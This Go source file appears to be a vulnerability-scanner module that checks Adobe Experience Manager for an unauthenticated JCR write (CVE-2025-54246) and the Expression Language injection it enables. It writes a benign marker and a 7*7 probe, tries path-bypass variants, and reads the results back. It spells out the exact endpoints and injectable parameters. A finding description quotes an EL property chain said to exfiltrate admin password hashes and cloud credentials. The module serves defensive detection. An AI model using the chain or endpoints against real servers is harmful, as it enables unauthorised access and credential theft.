// Package aem_cloudsettings_injection detects the AEM cloud-settings pre-auth
// write chain (CVE-2025-54246) and the Expression Language injection it enables
// (CVE-2025-54247 / CVE-2025-54248). Both are confirmed strictly in-band: a probe
// value is written through the BulkImportConfigServlet and read back through the
// ConfDeliveryServlet, so no out-of-band infrastructure is needed. The writes are
// benign (a random marker property, and a 7*7 arithmetic probe) — no script
// execution beyond harmless EL arithmetic is ever performed.
package aem_cloudsettings_injection

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	aem "github.com/vigolium/vigolium/pkg/modules/infra/aem"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/types/severity"
)

const (
	// reproduceRounds is one higher than the AEM family default (2): this module
	// performs a state-changing write and reports Critical injection findings, so
	// each read-back must survive an extra independent confirmation round.
	reproduceRounds = 3
	// maxFormTries bounds the dispatcher-bypass fan-out tried for the write and read
	// paths, and probeBudget caps the total requests spent locating a working pair.
	maxFormTries = 8
	probeBudget  = 80

	writeBase = "/conf/global/settings/dam/import/cloudsettings.bulkimportConfig.json"
	readBase  = "/etc/cloudsettings/.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content"

	formCT = "application/x-www-form-urlencoded"
)

var refs = []string{
	"https://slcyber.io/research-center/finding-critical-bugs-in-adobe-experience-manager/",
	"https://nvd.nist.gov/vuln/detail/CVE-2025-54246",
	"https://nvd.nist.gov/vuln/detail/CVE-2025-54248",
}

// elCombos are the (resourceType, parameter) pairs whose JSP evaluates a written
// property as Expression Language.
var elCombos = []struct {
	resourceType string
	param        string
}{
	{"/libs/cq/gui/components/projects/admin/actions/view/translationpage/translationpage.jsp", "action"},
	{"/libs/foundation/components/page/redirect.jsp", "redirectTarget"},
}

type Module struct {
	modkit.BaseActiveModule
	ds dedup.Lazy[dedup.DiskSet]
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeHost,
			modkit.AllInsertionPointTypes,
		),
		ds: dedup.LazyDiskSet("aem_cloudsettings_injection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) IncludesBaseCanProcess() bool { return false }

func (m *Module) CanProcess(ctx *httpmsg.HttpRequestResponse) bool {
	return ctx != nil && ctx.Request() != nil
}

func (m *Module) ScanPerHost(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, nil
	}
	host := urlx.Host

	if !modkit.BeginHostProbeKey(scanCtx, httpClient, &m.ds, host) {
		return nil, nil
	}
	if !aem.ConfirmAEM(ctx, httpClient, scanCtx) {
		return nil, nil
	}

	baseURL := urlx.Scheme + "://" + urlx.Host

	// Locate a working (write form, read form) pair by writing a benign marker and
	// reading it straight back. Failure here means the chain is not exploitable.
	pair, ok := m.findWritePrimitive(ctx, httpClient)
	if !ok {
		return nil, nil
	}

	var results []*output.ResultEvent
	results = append(results, m.buildPreAuthWrite(pair, baseURL))

	// The write primitive works — escalate to EL injection using the same forms.
	if el, ok := m.probeEL(ctx, httpClient, pair); ok {
		results = append(results, m.buildELInjection(pair, el, baseURL))
	}
	return results, nil
}

// pair is a confirmed write/read form and the marker that proved the read-back.
type pair struct {
	writePath string // the (possibly bypassed) bulkimport POST target
	readPath  string // the (possibly bypassed) ConfDeliveryServlet GET target
}

func (p pair) isBypass() bool { return p.writePath != writeBase || p.readPath != readBase }

// findWritePrimitive writes a fresh marker property through each candidate write
// form and reads it back through each candidate read form, returning the first pair
// whose read-back contains the exact marker and reproduces.
func (m *Module) findWritePrimitive(ctx *httpmsg.HttpRequestResponse, httpClient *http.Requester) (pair, bool) {
	writeForms := aem.CappedBypasses(writeBase, maxFormTries)
	readForms := aem.CappedBypasses(readBase, maxFormTries)
	budget := probeBudget

	for _, wf := range writeForms {
		marker := "vig" + modkit.FreshCanary()
		body := url.Values{
			"importSource":       {"UrlBased"},
			"sling:resourceType": {"vig/probe"},
			"vigmark":            {marker},
		}.Encode()
		aem.Post(ctx, httpClient, wf, body, map[string]string{"Content-Type": formCT})
		budget--

		for _, rf := range readForms {
			if budget <= 0 {
				return pair{}, false
			}
			res := aem.Get(ctx, httpClient, rf, nil)
			budget--
			if !res.OK || !strings.Contains(res.Body, marker) || modkit.ResemblesObservedPage(ctx, res.Body) {
				continue
			}
			if !aem.ReproduceMarker(ctx, httpClient, rf, reproduceRounds, func(r aem.ProbeResult) bool {
				return strings.Contains(r.Body, marker)
			}) {
				continue
			}
			return pair{writePath: wf, readPath: rf}, true
		}
		if budget <= 0 {
			return pair{}, false
		}
	}
	return pair{}, false
}

type elResult struct {
	resourceType string
	param        string
	evaluated    string // the pre49post value proving evaluation
}

// probeEL writes a pre#{7*7}post probe via each EL-capable resourceType and
// confirms the read-back contains pre49post while the literal #{7*7} is absent —
// i.e. the server evaluated the expression.
func (m *Module) probeEL(ctx *httpmsg.HttpRequestResponse, httpClient *http.Requester, p pair) (elResult, bool) {
	for _, c := range elCombos {
		pre := "vp" + modkit.FreshCanary()
		post := modkit.FreshCanary() + "vq"
		payload := pre + "#{7*7}" + post
		evaluated := pre + "49" + post
		literal := pre + "#{7*7}" + post

		body := url.Values{
			"importSource":       {"UrlBased"},
			"sling:resourceType": {c.resourceType},
			c.param:              {payload},
		}.Encode()
		aem.Post(ctx, httpClient, p.writePath, body, map[string]string{"Content-Type": formCT})

		res := aem.Get(ctx, httpClient, p.readPath, nil)
		if !res.OK || !strings.Contains(res.Body, evaluated) || strings.Contains(res.Body, literal) {
			continue
		}
		if !aem.ReproduceMarker(ctx, httpClient, p.readPath, reproduceRounds, func(r aem.ProbeResult) bool {
			return strings.Contains(r.Body, evaluated) && !strings.Contains(r.Body, literal)
		}) {
			continue
		}
		return elResult{resourceType: c.resourceType, param: c.param, evaluated: evaluated}, true
	}
	return elResult{}, false
}

func (m *Module) buildPreAuthWrite(p pair, baseURL string) *output.ResultEvent {
	matchedURL := baseURL + p.writePath
	res := &output.ResultEvent{
		ModuleID:      ModuleID,
		Host:          aem.HostFromBase(baseURL),
		URL:           matchedURL,
		Matched:       matchedURL,
		MatcherStatus: true,
		ExtractedResults: []string{
			"write servlet: " + p.writePath,
			"read-back servlet: " + p.readPath,
			"benign marker property written and read back verbatim",
		},
		Info: output.Info{
			Name: "AEM Pre-Auth JCR Node Write (BulkImportConfigServlet)",
			Description: fmt.Sprintf(
				"An unauthenticated request wrote a JCR property under /conf/global/settings/dam/import/cloudsettings via the BulkImportConfigServlet (%s) and read it straight back through the ConfDeliveryServlet (%s). Both servlets act under privileged service accounts, so this is a pre-authentication arbitrary node write with a read-back channel (CVE-2025-54246) — the primitive behind the cloud-settings EL-injection config exfiltration.",
				p.writePath, p.readPath,
			),
			Severity:   severity.Critical,
			Confidence: severity.Firm,
			Tags:       append([]string{"aem", "adobe", "acl", "cve", "cve2025", "pre-auth-write"}, aem.ACLBypassTag(p.isBypass())...),
			Reference:  refs,
		},
	}
	if p.isBypass() {
		modkit.AnnotatePathBypassFinding(res, p.writePath)
	}
	return res
}

func (m *Module) buildELInjection(p pair, el elResult, baseURL string) *output.ResultEvent {
	matchedURL := baseURL + p.writePath
	res := &output.ResultEvent{
		ModuleID:      ModuleID,
		Host:          aem.HostFromBase(baseURL),
		URL:           matchedURL,
		Matched:       matchedURL,
		MatcherStatus: true,
		ExtractedResults: []string{
			"resourceType: " + el.resourceType,
			"parameter: " + el.param,
			"7*7 evaluated to 49 in read-back: " + el.evaluated,
			"write servlet: " + p.writePath,
			"read-back servlet: " + p.readPath,
		},
		Info: output.Info{
			Name: "AEM Expression Language Injection (Cloud Settings)",
			Description: fmt.Sprintf(
				"A property written through the cloud-settings pre-auth write and rendered by %s (%s parameter) evaluated the Expression Language probe #{7*7} to 49 in the read-back, with the literal #{7*7} absent — server-side EL injection (CVE-2025-54247/54248). Chaining property accesses such as #{pageContext.class.classLoader.bundle.bundleContext.bundles[N].registeredServices[M].properties} exfiltrates the full OSGi configuration, including admin password hashes and cloud/API credentials.",
				el.resourceType, el.param,
			),
			Severity:   severity.Critical,
			Confidence: severity.Certain,
			Tags:       append([]string{"aem", "adobe", "el-injection", "injection", "rce", "cve", "cve2025"}, aem.ACLBypassTag(p.isBypass())...),
			Reference:  refs,
		},
	}
	if p.isBypass() {
		modkit.AnnotatePathBypassFinding(res, p.writePath)
	}
	return res
}
